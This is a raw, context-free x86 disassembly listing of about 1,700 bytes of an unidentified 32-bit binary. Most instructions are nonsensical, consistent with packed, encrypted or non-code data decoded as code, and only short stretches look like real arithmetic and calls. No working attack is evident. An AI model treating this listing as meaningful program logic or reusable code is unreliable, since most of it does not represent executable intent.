  41047e:	mov    dh,0xb1
  410480:	push   ebp
  410481:	fs pop ss
  410483:	or     ah,BYTE PTR [ebp-0x1c]
  410486:	pop    ss
  410487:	sub    DWORD PTR [edx+ecx*2],esp
  41048a:	ss out 0xf1,al
  41048d:	mov    gs,WORD PTR [ebx+ecx*4-0x6442a805]
  410494:	shl    DWORD PTR [esi+0x31d8af1],cl
  41049a:	dec    edi
  41049b:	or     ch,dl
  41049d:	ins    DWORD PTR es:[edi],dx
  41049e:	sbb    dl,ch
  4104a0:	fsubrp st(3),st
  4104a2:	and    DWORD PTR [esi-0x64],0xe2d3da92
  4104a9:	scas   al,BYTE PTR es:[edi]
  4104aa:	dec    eax
  4104ab:	dec    ecx
  4104ac:	das    
  4104ad:	push   ebx
  4104ae:	push   ds
  4104af:	shl    BYTE PTR [ebx+0x61],cl
  4104b2:	(bad)  
  4104b3:	cmp    edi,DWORD PTR [esi-0x58]
  4104b6:	mov    ebp,0xbaf8ed8f
  4104bb:	cwde   
  4104bc:	jl     0x4104e1
  4104be:	imul   eax,DWORD PTR [edi-0x4a],0x452bda70
  4104c5:	push   ds
  4104c6:	fldcw  WORD PTR [ebx-0x4b55856a]
  4104cc:	jae    0x4104c6
  4104ce:	mov    dh,BYTE PTR [eax-0x1]
  4104d1:	out    0x90,eax
  4104d3:	jnp    0x410486
  4104d5:	or     cl,ch
  4104d7:	retf   
  4104d8:	inc    edx
  4104d9:	adc    DWORD PTR [edi+eax*8-0xd],0xffffff91
  4104de:	mov    ecx,DWORD PTR [edx-0x3236d308]
  4104e4:	push   ss
  4104e5:	iret   
  4104e6:	jmp    0x410512
  4104e8:	cmp    eax,0x95cc29b6
  4104ed:	sti    
  4104ee:	cli    
  4104ef:	jmp    0xa5e1ac27
  4104f4:	pop    edi
  4104f5:	das    
  4104f6:	and    BYTE PTR [edx],cl
  4104f8:	cmp    ebx,esi
  4104fa:	push   ss
  4104fb:	mov    bh,0x31
  4104fd:	xchg   ecx,eax
  4104fe:	adc    edx,edi
  410500:	ds daa 
  410502:	jb     0x4104dd
  410504:	ds scas al,BYTE PTR es:[edi]
  410506:	ficomp WORD PTR [edi+0x7f9f98c1]
  41050c:	int3   
  41050d:	mov    DWORD PTR [esi+0x46eac340],0x5ddd2543
  410517:	jecxz  0x41055d
  410519:	jg     0x410552
  41051b:	les    edx,FWORD PTR [eax+0x1b43a867]
  410521:	stos   BYTE PTR es:[edi],al
  410522:	lea    edx,[ecx-0x37]
  410525:	out    0xd9,al
  410527:	mov    bl,0x4b
  410529:	sub    DWORD PTR [ebp-0x25],0xffffffca
  41052d:	call   0x3d86dd73
  410532:	hlt    
  410533:	dec    edi
  410534:	inc    ebx
  410535:	mov    dl,0xde
  410537:	add    BYTE PTR [edx],cl
  410539:	push   ebx
  41053a:	mov    ebp,0x6cf2cb10
  41053f:	loop   0x4104d1
  410541:	repnz out dx,al
  410543:	retf   
  410544:	adc    ebp,DWORD PTR [edx+edx*2+0x5a3ca576]
  41054b:	in     al,0xce
  41054d:	pop    edx
  41054e:	fsub   DWORD PTR [ebx-0x9]
  410551:	out    0x62,al
  410553:	int3   
  410554:	ret    
  410555:	(bad)  
  410556:	sti    
  410557:	jge    0x410582
  410559:	lock or al,0x0
  41055c:	and    ch,al
  41055e:	push   0xc84f6cb9
  410563:	lods   al,BYTE PTR ds:[esi]
  410564:	cmp    eax,DWORD PTR [edx-0x5f]
  410567:	jo     0x410559
  410569:	pop    ebp
  41056a:	jbe    0x4105ca
  41056c:	lds    esi,FWORD PTR [edi-0x17a133dc]
  410572:	inc    eax
  410573:	loopne 0x4104f9
  410575:	(bad)  [ebp-0x2e63920f]
  41057b:	add    al,0xa6
  41057d:	popf   
  41057e:	sub    BYTE PTR [edx],0xe
  410581:	or     ch,0x2
  410584:	aaa    
  410585:	cmp    BYTE PTR [eax],bl
  410587:	or     ebp,DWORD PTR [esi-0x48b19ff6]
  41058d:	js     0x4105b6
  41058f:	mov    bl,0xbe
  410591:	jb     0x410559
  410593:	xchg   ecx,eax
  410594:	xchg   edi,eax
  410595:	retf   0xdf32
  410598:	fmul   DWORD PTR [ecx+0x23]
  41059b:	out    dx,al
  41059c:	repnz sub bl,ah
  41059f:	xchg   ebp,eax
  4105a0:	mov    ?,edi
  4105a2:	gs in  al,0xc9
  4105a5:	jge    0x410613
  4105a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105a8:	inc    ecx
  4105a9:	(bad)  
  4105aa:	jne    0x410534
  4105ac:	xchg   DWORD PTR [ecx+eiz*4+0x39],eax
  4105b0:	pop    edx
  4105b1:	xor    ebx,DWORD PTR ds:0xcab6e298
  4105b7:	push   edx
  4105b8:	(bad)  
  4105b9:	pop    eax
  4105ba:	sub    eax,0x677de2f4
  4105bf:	lea    edi,[ecx+0x0]
  4105c2:	xchg   esi,eax
  4105c3:	call   0xac23f08a
  4105c8:	jae    0x41054d
  4105ca:	pop    ds
  4105cb:	icebp  
  4105cc:	dec    edx
  4105cd:	jne    0x4105cc
  4105cf:	adc    eax,0x128e2922
  4105d4:	xor    bh,BYTE PTR [eax]
  4105d6:	test   BYTE PTR [ecx],ch
  4105d8:	mov    ebx,0x3b991286
  4105dd:	loope  0x410575
  4105df:	xchg   esp,eax
  4105e0:	xor    ah,BYTE PTR [edi]
  4105e2:	call   0x8b1bc69b
  4105e7:	cmp    DWORD PTR [esi],0xaf1dad8d
  4105ed:	dec    ebx
  4105ee:	inc    ebx
  4105ef:	aad    0xe9
  4105f1:	lahf   
  4105f2:	daa    
  4105f3:	(bad)
  4105f7:	loopne 0x4105b3
  4105f9:	jecxz  0x410596
  4105fb:	xchg   edi,eax
  4105fc:	mov    dl,0xbe
  4105fe:	stc    
  4105ff:	fbstp  TBYTE PTR ds:0x23a0658a
  410605:	xchg   ebp,eax
  410606:	mov    al,ds:0xfb2f643e
  41060b:	stos   DWORD PTR es:[edi],eax
  41060c:	sbb    BYTE PTR [edi-0x3],bh
  41060f:	fild   DWORD PTR [ebx-0x2ba27423]
  410615:	mov    ecx,DWORD PTR [ebp+0xc]
  410618:	add    esi,DWORD PTR [ecx]
  41061a:	xor    edx,0xcb79b577
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x422286
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	fld    QWORD PTR [edi+eax*2-0x1b]
  410674:	jecxz  0x410665
  410676:	cmp    al,0xbe
  410678:	mov    esi,0xbebec4e3
  41067d:	dec    ch
  41067f:	imul   edx,DWORD PTR [ebx+esi*8+0x55d43383],0xffffffda
  410687:	cdq    
  410688:	mov    WORD PTR [ebx+0x6e],?
  41068b:	jle    0x4106d5
  41068d:	js     0x410651
  41068f:	mov    ds:0xd3861a36,al
  410694:	pop    ss
  410695:	jne    0x410663
  410697:	pop    ecx
  410698:	and    ebp,DWORD PTR [eax]
  41069a:	int3   
  41069b:	(bad)  
  41069c:	out    dx,al
  41069d:	mov    ebp,0xdf755731
  4106a2:	pushf  
  4106a3:	mov    ss,WORD PTR [ebx-0x22]
  4106a6:	fnsave [esi]
  4106a8:	cli    
  4106a9:	push   ss
  4106aa:	jb     0x4106d8
  4106ac:	adc    al,0x4d
  4106ae:	push   es
  4106af:	mov    esp,0x464c0599
  4106b4:	icebp  
  4106b5:	aaa    
  4106b6:	shr    edi,0x42
  4106b9:	(bad)  
  4106ba:	jg     0x41070c
  4106bc:	dec    ebp
  4106bd:	mov    eax,0x34efa021
  4106c2:	arpl   WORD PTR ds:[ecx-0x73169098],ax
  4106c9:	sbb    eax,0x181f8af1
  4106ce:	sub    bh,cl
  4106d0:	aad    0x56
  4106d2:	xor    cl,BYTE PTR [edx+0x2a]
  4106d5:	jecxz  0x4106c8
  4106d7:	pop    esp
  4106d8:	popf   
  4106d9:	cs jmp 0x17560a93
  4106df:	add    eax,0x975c7e28
  4106e4:	push   esp
  4106e5:	test   al,0xec
  4106e7:	add    al,0x25
  4106e9:	sub    al,0xfc
  4106eb:	xchg   ecx,eax
  4106ec:	popa   
  4106ed:	mov    ch,0x9c
  4106ef:	sahf   
  4106f0:	or     ebx,edi
  4106f2:	push   0xffffffb2
  4106f4:	jnp    0x410699
  4106f6:	mov    esi,0xd3b8a181
  4106fb:	cld    
  4106fc:	jg     0x4106f9
  4106fe:	and    BYTE PTR [esi+0x73],ah
  410701:	scas   al,BYTE PTR es:[edi]
  410702:	(bad)  
  410703:	in     al,0xe2
  410705:	xor    dh,BYTE PTR [edx+0x22]
  410708:	jb     0x4106c0
  41070a:	std    
  41070b:	push   ecx
  41070c:	xor    eax,ecx
  41070e:	out    0xd5,al
  410710:	mov    ds:0x4efd742e,eax
  410715:	mov    ah,0x1f
  410717:	xchg   edx,eax
  410718:	mov    esp,0xc1024c13
  41071d:	push   esp
  41071e:	enter  0x3563,0x3f
  410722:	xchg   DWORD PTR [ecx],edx
  410724:	mov    BYTE PTR [esi],bh
  410726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410727:	and    al,0x0
  410729:	retf   0xacaa
  41072c:	sbb    BYTE PTR [eax+0x7d],ch
  41072f:	ret    0xd66c
  410732:	and    ah,BYTE PTR [edx+esi*8]
  410735:	test   DWORD PTR [esi-0x33104996],edi
  41073b:	and    BYTE PTR [esi*4+0x57e7901a],dh
  410742:	push   ss
  410743:	in     eax,dx
  410744:	iret   
  410745:	pushf  
  410746:	dec    esp
  410747:	mov    edx,0xf5210ce
  41074c:	xor    cl,BYTE PTR [eax]
  41074e:	mov    dh,0x5b
  410750:	dec    edx
  410751:	xchg   DWORD PTR [edx-0x21],ebp
  410754:	das    
  410755:	fldcw  WORD PTR [ebx]
  410757:	je     0x410711
  410759:	inc    ecx
  41075a:	sbb    ch,bl
  41075c:	js     0x4106fd
  41075e:	sub    DWORD PTR [edx],esi
  410760:	int    0x68
  410762:	jns    0x41072c
  410764:	ret    0x8255
  410767:	xor    BYTE PTR [esi],ch
  410769:	fstp   TBYTE PTR fs:[edi]
  41076c:	cmp    al,0x2d
  41076e:	mov    dl,BYTE PTR [edx-0x21]
  410771:	xchg   edi,eax
  410772:	cld    
  410773:	inc    ecx
  410774:	popf   
  410775:	repz test eax,0xef0e9f1d
  41077b:	pop    edi
  41077c:	test   eax,0x3a5d355d
  410781:	daa    
  410782:	jp     0x41076b
  410784:	pop    eax
  410785:	pop    edx
  410786:	xchg   esp,eax
  410787:	xchg   BYTE PTR [ebx-0x5b58325f],ah
  41078d:	int    0x7c
  41078f:	pusha  
  410790:	aam    0x5d
  410792:	push   edx
  410793:	int3   
  410794:	fcom   DWORD PTR [edx-0x52c86d4b]
  41079a:	cmp    BYTE PTR [edi],0x4f
  41079d:	mov    edx,0x56548855
  4107a2:	dec    esp
  4107a3:	and    ecx,DWORD PTR [esp+esi*8]
  4107a6:	shl    bl,0xbc
  4107a9:	sahf   
  4107aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ab:	into   
  4107ac:	pushf  
  4107ad:	clc    
  4107ae:	outs   dx,DWORD PTR ds:[esi]
  4107af:	cmp    cl,BYTE PTR [edi-0x6d]
  4107b2:	sub    eax,0x8620d86
  4107b7:	dec    ebp
  4107b8:	adc    DWORD PTR [edi-0x3],edx
  4107bb:	clc    
  4107bc:	jo     0x410774
  4107be:	xor    DWORD PTR [eax],edx
  4107c0:	push   ds
  4107c1:	mov    eax,ds:0x7e78acbe
  4107c6:	jnp    0x4107d9
  4107c8:	push   esp
  4107c9:	jmp    0xcdde:0x72d2fc58
  4107d0:	jle    0x410814
  4107d2:	adc    edx,ecx
  4107d4:	jb     0x4107d8
  4107d6:	repz out 0x9e,eax
  4107d9:	mov    dh,BYTE PTR [edx]
  4107db:	cmc    
  4107dc:	inc    ecx
  4107dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107de:	mov    edx,0x4433f09e
  4107e3:	mov    ?,WORD PTR [ebp-0x4e]
  4107e6:	das    
  4107e7:	fwait
  4107e8:	jp     0x4107bb
  4107ea:	add    BYTE PTR [esi],bl
  4107ec:	popa   
  4107ed:	mov    eax,ds:0x8048a866
  4107f2:	data16 jno 0x41078f
  4107f5:	or     al,0xf5
  4107f7:	jnp    0x4107bb
  4107f9:	jecxz  0x41086e
  4107fb:	mov    WORD PTR [ecx-0x1ff6e96c],cs
  410801:	mov    WORD PTR [edi-0x2f5e4507],gs
  410807:	sub    al,0x47
  410809:	out    0x69,eax
  41080b:	ret    
  41080c:	popa   
  41080d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41080e:	imul   BYTE PTR [esi]
  410810:	out    0x43,al
  410812:	rcr    DWORD PTR [ecx+0x53],0x68
  410816:	fmul   DWORD PTR [ebp+0x6e0ab548]
  41081c:	xor    ecx,DWORD PTR [ecx]
  41081e:	pop    eax
  41081f:	clc    
  410820:	pop    edx
  410821:	jecxz  0x4107b3
  410823:	clc    
  410824:	das    
  410825:	data16 jge 0x410895
  410828:	xchg   edi,esi
  41082a:	adc    al,0x5f
  41082c:	mov    eax,ds:0x10e71d93
  410831:	xlat   BYTE PTR ds:[ebx]
  410832:	jp     0x41088b
  410834:	repz int 0x48
  410837:	popa   
  410838:	popa   
  410839:	aam    0x14
  41083b:	(bad)  [ecx+0x7c6abf40]
  410841:	dec    ecx
  410842:	arpl   WORD PTR [esi-0x5f],dx
  410845:	aam    0xfe
  410847:	pop    ecx
  410848:	inc    ecx
  410849:	mov    al,0x44
  41084b:	loope  0x410842
  41084d:	jnp    0x410891
  41084f:	add    BYTE PTR [eax],bh
  410851:	mov    dl,0x52
  410853:	sub    bh,BYTE PTR [edi+0x2c]
  410856:	adc    esp,ebx
  410858:	inc    ebp
  410859:	out    dx,eax
  41085a:	xchg   esi,eax
  41085b:	jno    0x410885
  41085d:	lods   eax,DWORD PTR ds:[esi]
  41085e:	mov    ecx,0x56884696
  410863:	jne    0x4107e6
  410865:	repnz xchg esi,eax
  410867:	cmp    al,0xa3
  410869:	inc    esi
  41086a:	cmp    ebp,DWORD PTR [ebx+0x71f66539]
  410870:	out    dx,eax
  410871:	mov    esi,0xcbfb8f51
  410876:	mov    ds:0xcbeb65b4,eax
  41087b:	add    al,0xc
  41087d:	(bad)  
  41087e:	mov    ds:0x68b28e05,eax
  410883:	mov    ?,WORD PTR [esi+0x56b7ca4e]
  410889:	or     al,0x9e
  41088b:	mov    dl,0x74
  41088d:	and    DWORD PTR [edx-0x7486e916],eax
  410893:	and    al,0x22
  410895:	adc    BYTE PTR [esp+ebp*4-0x137a509e],0xe3
  41089d:	cmp    BYTE PTR [ecx-0x10e2fcf8],0xb3
  4108a4:	jg     0x41086f
  4108a6:	hlt    
  4108a7:	ja     0x410900
  4108a9:	and    BYTE PTR [ecx-0x40],bl
  4108ac:	cmp    dh,bh
  4108ae:	add    eax,0xd291682b
  4108b3:	mov    BYTE PTR [edi-0x5a220274],dl
  4108b9:	or     al,0x45
  4108bb:	adc    DWORD PTR [edi+0x3d],0x26
  4108bf:	out    dx,eax
  4108c0:	in     al,0x3a
  4108c2:	test   DWORD PTR [ebx-0x49],esp
  4108c5:	jo     0x410887
  4108c7:	jbe    0x410875
  4108c9:	in     al,0xe8
  4108cb:	pop    esp
  4108cc:	mov    bh,0x75
  4108ce:	(bad)  
  4108cf:	push   0x5b964860
  4108d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d5:	inc    ebx
  4108d6:	sub    DWORD PTR [ebx+0x78],esi
  4108d9:	repz sub al,0x6a
  4108dc:	jmp    0xf792:0x6cbc67e0
  4108e3:	imul   ecx,DWORD PTR [edi-0x7d8a1444],0xd2449fb7
  4108ed:	jle    0x4108ae
  4108ef:	mov    bl,BYTE PTR [eax-0x2262813a]
  4108f5:	scas   al,BYTE PTR es:[edi]
  4108f6:	mov    ebp,0xfbfbee3f
  4108fb:	add    DWORD PTR ds:0xc54fc4e3,ebx
  410901:	push   ds
  410902:	sti    
  410903:	(bad)  
  410904:	xor    edx,ecx
  410906:	jg     0x4108a5
  410908:	retf   0xdcd6
  41090b:	cmp    DWORD PTR [ecx+0x1f],0xd89ad077
  410912:	and    bh,BYTE PTR [ebp+0x79]
  410915:	rcl    DWORD PTR [edx+0x6b9078bf],1
  41091b:	mov    eax,0x993897fb
  410920:	adc    BYTE PTR [ebx+0x5ef242a9],dl
  410926:	pop    ebp
  410927:	(bad)  
  410928:	repnz adc ch,al
  41092b:	or     DWORD PTR [edx+0x60b12c54],edi
  410931:	pop    ebp
  410932:	clc    
  410933:	or     eax,0xc7ca7609
  410938:	fstp   QWORD PTR ds:0x20e48fed
  41093e:	jmp    0x61ac:0xee22eb8
  410945:	imul   eax,DWORD PTR [esi+ebx*8+0x298fc906],0xffffff90
  41094d:	mov    WORD PTR [ebx-0x3b1e06b],gs
  410953:	fwait
  410954:	dec    edi
  410955:	mov    bl,0x5e
  410957:	sub    BYTE PTR ds:0x34d9f22c,dl
  41095d:	sbb    eax,0x7f3a5e9a
  410962:	repz jecxz 0x41090e
  410965:	inc    ebp
  410966:	adc    ch,BYTE PTR [edi-0x79]
  410969:	sub    edx,DWORD PTR [esp+edi*8+0x4a457b63]
  410970:	dec    ebx
  410971:	xchg   ebx,eax
  410972:	adc    al,BYTE PTR [edx+0x7663a892]
  410978:	ficom  WORD PTR [esi]
  41097a:	outs   dx,BYTE PTR ds:[esi]
  41097b:	jecxz  0x4109a3
  41097d:	mov    WORD PTR [ecx],cs
  41097f:	(bad)  
  410980:	imul   esp,ebp,0x3e
  410983:	add    ebp,DWORD PTR [ebp+esi*4+0x78]
  410987:	xchg   esi,eax
  410988:	lds    edx,FWORD PTR [esp+edx*1-0x76a12ef2]
  41098f:	jmp    0x3395:0x3b811026
  410996:	(bad)  
  410997:	cs nop
  410999:	cwde   
  41099a:	rol    BYTE PTR [esp+edi*1+0x13],cl
  41099e:	sbb    ecx,DWORD PTR [eax]
  4109a0:	inc    ebp
  4109a1:	out    0x6d,al
  4109a3:	fnsave [eax]
  4109a5:	or     cl,dl
  4109a7:	inc    eax
  4109a8:	pop    es
  4109a9:	outs   dx,BYTE PTR ds:[esi]
  4109aa:	data16 daa 
  4109ac:	ins    BYTE PTR es:[edi],dx
  4109ad:	jb     0x41098b
  4109af:	pop    esi
  4109b0:	fdivrp st(4),st
  4109b2:	mov    dl,0xf5
  4109b4:	fisubr WORD PTR [edx-0x4a]
  4109b7:	fs push eax
  4109b9:	scas   eax,DWORD PTR es:[edi]
  4109ba:	xor    edx,esi
  4109bc:	add    ebx,esi
  4109be:	int3   
  4109bf:	(bad)  
  4109c0:	jp     0x410a1b
  4109c2:	mov    cl,0x42
  4109c4:	aam    0xce
  4109c6:	mov    WORD PTR [ebp-0x37],ss
  4109c9:	ficomp DWORD PTR [ebx]
  4109cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109cc:	sub    eax,0xfb999d40
  4109d1:	jle    0x410988
  4109d3:	jmp    0x79074e49
  4109d8:	dec    esi
  4109d9:	pop    DWORD PTR [esi-0x1c]
  4109dc:	dec    edx
  4109dd:	clc    
  4109de:	jnp    0x4109f3
  4109e0:	push   edx
  4109e1:	xor    al,0xff
  4109e3:	mov    edi,0x3f5c0c4e
  4109e8:	jg     0x410980
  4109ea:	mov    DWORD PTR [esi],edx
  4109ec:	loopne 0x410997
  4109ee:	pop    ds
  4109ef:	loope  0x410a00
  4109f1:	xor    DWORD PTR [ebx*8-0x74da780c],edx
  4109f8:	lock inc ecx
  4109fa:	sahf   
  4109fb:	xchg   ebx,eax
  4109fc:	in     eax,0x93
  4109fe:	adc    eax,0x2e3328dd
  410a03:	sbb    BYTE PTR [ecx+0xaf402da],0x4a
  410a0a:	sbb    bl,al
  410a0c:	or     ebp,ebp
  410a0e:	sbb    bl,BYTE PTR [ecx]
  410a10:	sbb    DWORD PTR [eax+0x2b],ecx
  410a13:	scas   al,BYTE PTR es:[edi]
  410a14:	mov    esi,DWORD PTR [ebp-0x3c]
  410a17:	add    ecx,eax
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0xe11ee4a4
  410a4c:	nop
  410a4d:	push   ss
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0xc4557b80
  410a59:	es mov ecx,0xf8bdec9
  410a5f:	inc    ebp
  410a60:	stos   BYTE PTR es:[edi],al
  410a61:	mov    cl,0x62
  410a63:	jmp    0x410ace
  410a65:	mov    esi,0x802897cd
  410a6a:	dec    edi
  410a6b:	in     al,0xe8
  410a6d:	xchg   BYTE PTR [edx+0x4edb7048],dh
  410a73:	cli    
  410a74:	sbb    eax,0xbccbb7fc
  410a79:	cmp    eax,0xbb5167fc
  410a7e:	in     eax,0x1d
  410a80:	push   ds
  410a81:	rol    ebp,cl
  410a83:	sar    DWORD PTR [esi+0x645334f4],0xa9
  410a8a:	cmovb  edi,DWORD PTR [eax]
  410a8d:	inc    ebx
  410a8e:	dec    ebp
  410a8f:	inc    edi
  410a90:	mov    al,cl
  410a92:	hlt    
  410a93:	sub    al,0x1a
  410a95:	fistp  WORD PTR [esi]
  410a97:	lods   eax,DWORD PTR ds:[esi]
  410a98:	test   al,0x9b
  410a9a:	jge    0x410a55
  410a9c:	ds test eax,0xb917854b
  410aa2:	scas   eax,DWORD PTR es:[edi]
  410aa3:	pop    ss
  410aa4:	ret    0x7549
  410aa7:	xchg   esp,eax
  410aa8:	aad    0xf2
  410aaa:	mov    edx,0x4f8de561
  410aaf:	dec    ebx
  410ab0:	ins    BYTE PTR es:[edi],dx
  410ab1:	push   esi
  410ab2:	jmp    0xde199da
  410ab7:	in     eax,dx
  410ab8:	pop    ss
  410ab9:	push   esi
  410aba:	and    DWORD PTR [esi],0x19
  410abd:	xchg   edi,eax
  410abe:	(bad)  
  410ac0:	xchg   ecx,eax
  410ac1:	dec    bp
  410ac3:	sbb    DWORD PTR [eax+0x60],0x5d37978c
  410aca:	cs fs mov bh,0xf7
  410ace:	jbe    0x410a78
  410ad0:	sbb    BYTE PTR [ebp-0x9729e94],dh
  410ad6:	pop    ds
  410ad7:	lods   eax,DWORD PTR ds:[esi]
  410ad8:	pop    ebx
  410ad9:	out    0xae,al
  410adb:	push   cs
  410adc:	fdivr  st(0),st
  410ade:	fadd   DWORD PTR [ebx]
  410ae0:	mulps  xmm0,XMMWORD PTR [ebx+0x756aa050]
  410ae7:	mov    ch,0x30
  410ae9:	dec    edx
  410aea:	sbb    eax,0x948e091f
  410aef:	(bad)  
  410af0:	shl    BYTE PTR [esi],1
  410af2:	push   0x2660de01
  410af7:	bound  esi,QWORD PTR [ebp-0x498667ee]
  410afd:	jmp    0xfebdbafb
  410b02:	pop    esp
  410b03:	outs   dx,DWORD PTR ds:[esi]
  410b04:	mov    ds:0x2cfc73ed,eax
  410b09:	mov    al,ds:0xfbc12e92
  410b0e:	mov    eax,0x45c6123a
  410b13:	aam    0x82
  410b15:	push   ss
  410b16:	js     0x410ade
  410b18:	ds mov ah,0xbf
  410b1b:	dec    ebx
  410b1c:	retf   
  410b1d:	test   BYTE PTR [ebx-0x32],cl
  410b20:	(bad)  
  410b21:	push   esp
  410b22:	in     al,dx
  410b23:	ficom  WORD PTR [eax-0x4a331ec3]
  410b29:	dec    esi
  410b2a:	dec    edx
  410b2b:	scas   eax,DWORD PTR es:[edi]
  410b2c:	and    al,0x5d
  410b2e:	inc    esp
  410b2f:	dec    ebp
  410b30:	in     eax,dx
  410b31:	dec    edx
  410b32:	inc    edi
  410b33:	not    BYTE PTR [edi+edx*2]
  410b36:	adc    al,0x60
  410b38:	sub    edx,esi
  410b3a:	mov    ds:0x173f9c57,al
  410b3f:	add    BYTE PTR [eax-0x16],dl
  410b42:	mov    edi,0x2b0684f1
  410b47:	sbb    esp,DWORD PTR [ebx]
  410b49:	cli    
  410b4a:	mov    dh,0xec
  410b4c:	fld    st(1)
  410b4e:	push   esi
  410b4f:	adc    al,0x8b
  410b51:	into   
  410b52:	push   esi
  410b53:	dec    ecx
  410b54:	mov    ecx,0x2d3c20d1
  410b59:	sbb    bl,BYTE PTR [ebx+ecx*2+0x47]
  410b5d:	jae    0x410b28
  410b5f:	inc    edi
  410b60:	pop    edi
  410b61:	dec    ebp
  410b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b63:	xchg   ebx,eax
  410b64:	jle    0x410b05
  410b66:	repnz std 
  410b68:	stos   DWORD PTR es:[edi],eax
  410b69:	push   es
  410b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b6b:	ret    0x2ce1
  410b6e:	push   ss
  410b6f:	das    
  410b70:	pop    edx
  410b71:	imul   esp,DWORD PTR [ecx+0x2d24bc71],0x4d7aaf58
  410b7b:	int3   
  410b7c:	pop    ds
  410b7d:	xchg   ebp,eax
  410b7e:	mov    ch,BYTE PTR ds:[edx-0x7]
  410b82:	xor    eax,0x62487e76
  410b87:	add    BYTE PTR [ebp-0x42],dl
  410b8a:	lock mov dl,0x22
  410b8d:	mov    cl,0x6d
  410b8f:	add    dl,BYTE PTR [edi]
  410b91:	pop    ds
  410b92:	mov    ds:0x67017cbb,eax
  410b97:	inc    eax
  410b98:	push   ebx
  410b99:	xor    al,cl
  410b9b:	sahf   
  410b9c:	push   ss
  410b9d:	mov    al,ds:0xc2de37b0
  410ba2:	addr16 mov bl,0xce
  410ba5:	sub    DWORD PTR [edi],ebx
  410ba7:	dec    edx
  410ba8:	scas   eax,DWORD PTR es:[edi]
  410ba9:	js     0x410c05
  410bab:	xchg   edi,eax
  410bac:	in     eax,dx
  410bad:	int3   
  410bae:	inc    ebx
  410baf:	xor    DWORD PTR [ecx+eiz*4+0x730bfd08],edx
  410bb6:	enter  0x8e5,0x12
  410bba:	in     al,dx
  410bbb:	jne    0x410b44
  410bbd:	jnp    0x410b4f
  410bbf:	dec    ebp
  410bc0:	cmp    BYTE PTR [ebx+0x22],cl
  410bc3:	shl    DWORD PTR ds:0xb034cebf,cl
  410bc9:	sahf   
  410bca:	rol    DWORD PTR [eax+eax*4+0x38],1
  410bce:	in     al,0x10
  410bd0:	into   
  410bd1:	add    BYTE PTR [esi-0x7d],0x76
  410bd5:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410bd7:	dec    edx
  410bd8:	in     eax,0xa8
  410bda:	mov    ds:0x3a7a269a,eax
  410bdf:	jno    0x410c23
  410be1:	sub    DWORD PTR [edi],esi
  410be3:	jno    0x410be5
  410be5:	repz imul esi,ebx,0x88456b92
  410bec:	or     dh,dh
  410bee:	mov    ds:0xdf14e57f,al
  410bf3:	pusha  
  410bf4:	mov    ?,WORD PTR [ecx-0x44]
  410bf7:	dec    ebx
  410bf8:	bound  ecx,QWORD PTR [edx-0x76d4ed5e]
  410bfe:	shr    BYTE PTR [edx+0x21],0x9c
  410c02:	sub    dl,BYTE PTR [edi+ebp*4-0x3d]
  410c06:	pop    ss
  410c07:	cmc    
  410c08:	dec    ebp
  410c09:	mov    bh,0x43
  410c0b:	xchg   ebp,eax
  410c0c:	xchg   ebx,eax
  410c0d:	sbb    BYTE PTR [ebx-0x64],dl
  410c10:	adc    eax,0xc976aef1
  410c15:	push   ss
  410c16:	inc    BYTE PTR [ebx-0x51]
  410c19:	sbb    DWORD PTR [ecx],esp
  410c1b:	lds    edi,FWORD PTR [ebp+0x193c23fa]
  410c21:	fdiv   st(3),st
  410c23:	mov    edi,0x8b0ae41e
  410c28:	bound  edx,QWORD PTR [esi]
  410c2a:	pop    es
  410c2b:	popf   
  410c2c:	hlt    
  410c2d:	push   DWORD PTR [edx]
  410c2f:	add    BYTE PTR ds:0xb22bea47,bl
  410c35:	xchg   DWORD PTR [edx-0x17054f87],edx
  410c3b:	gs push ebp
  410c3d:	icebp  
  410c3e:	rcr    DWORD PTR [ebx],0x41
  410c41:	sbb    ah,ch
  410c43:	pop    esp
  410c44:	das    
  410c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c46:	pop    edx
  410c47:	and    DWORD PTR [esi],ecx
  410c49:	push   edx
  410c4a:	mov    DWORD PTR [edi-0x4d],edx
  410c4d:	dec    edx
  410c4e:	cwde   
  410c4f:	shl    BYTE PTR [edi],1
  410c51:	mov    edi,0xe7f3604f
  410c56:	cld    
